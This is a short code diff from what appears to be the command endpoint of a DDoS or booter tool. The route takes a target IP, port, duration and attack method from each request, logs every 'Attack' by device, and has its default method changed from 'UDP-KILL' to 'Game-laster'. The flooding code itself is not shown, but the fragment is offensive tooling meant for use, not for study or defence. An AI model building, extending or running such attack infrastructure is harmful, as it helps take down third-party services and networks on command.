@@ -340,7 +340,7 @@ def attack_endpoint():
         ip = data.get('ip')
         port = data.get('port')
         duration = data.get('duration')
-        method = data.get('method', 'UDP-KILL')
+        method = data.get('method', 'Game-laster')
         
         device_id_short = device_id[:8] if device_id else "unknown"
         log(f"🔵 Attack - Device: {device_id_short}... | Target: {ip}:{port} | Duration: {duration}s | Method: {method}")
